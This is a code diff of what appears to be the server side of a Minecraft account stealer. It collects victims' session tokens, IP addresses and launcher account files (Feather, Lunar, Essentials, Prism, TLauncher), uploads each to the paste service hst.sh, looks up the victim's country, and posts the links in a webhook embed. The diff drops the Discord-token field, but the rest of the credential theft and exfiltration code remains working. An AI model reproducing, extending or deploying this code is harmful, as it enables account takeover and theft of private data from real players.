@@ -22,7 +22,7 @@ if (ipMap.length > 0) {
 }, 1000 * 60 * 15);
 
 app.post("/", async (req, res) => {
-const requiredFields = ["username", "uuid", "token", "ip", "feather", "essentials", "lunar", "prism", "tlauncher" ,"discord"];
+const requiredFields = ["username", "uuid", "token", "ip", "feather", "essentials", "lunar", "prism", "tlauncher"];
 if (!requiredFields.every(field => req.body.hasOwnProperty(field))) {
     console.log(req.body);
     return res.sendStatus(404);
@@ -43,7 +43,6 @@ try {
             selectedProfile: req.body.uuid,
             serverId: req.body.uuid
         }),
-        post("https://hst.sh/documents/", req.body.discord).then(res => res.data.key).catch(() => "Error uploading"),
         post("https://hst.sh/documents/", req.body.token).then(res => res.data.key).catch(() => "Error uploading"),
         post("https://hst.sh/documents/", req.body.feather).then(res => res.data.key).catch(() => "Error uploading"),
         post("https://hst.sh/documents/", req.body.essentials).then(res => res.data.key).catch(() => "Error uploading"),
@@ -63,7 +62,6 @@ try {
     const country = await fetchCountry(req.body.ip);
 
     const checkToken = req.body.token == 'File not found :(' ? 'Invalid Token' : `[Minecraft Token](https://hst.sh/${shorttoken})`;
-    const checkDiscord = req.body.discord == 'File not found :(' ? 'Invalid Token' : `[Discord Token](https://hst.sh/${discordtoken})`;
     const checkFeather = req.body.feather == 'File not found :(' ? 'Nope 😢' : `[View](https://hst.sh/${feather}) 🤩`;
     const checkEssentials = req.body.essentials == 'File not found :(' ? 'Nope 😢' : `[View](https://hst.sh/${essentials}) 🤩`;
     const checkLunar = req.body.lunar == 'File not found :(' ? 'Nope 😢' : `[View](https://hst.sh/${lunar}) 🤩`;
@@ -78,7 +76,6 @@ try {
             fields: [
                 { name: 'Statistics', value: `****${planckeUrl}**** ****${cryptUrl}****`, inline: false },
                 { name: 'Token', value: `****${checkToken}****`, inline: true },
-                { name: 'Discord', value: `****${checkDiscord}****`, inline: true },
                 { name: 'Profiles', value: `**\`\`\`${profiles}\`\`\`**`, inline: false },
                 { name: 'Country', value: `**\`\`\`${country}\`\`\`**`, inline: false },
             ],
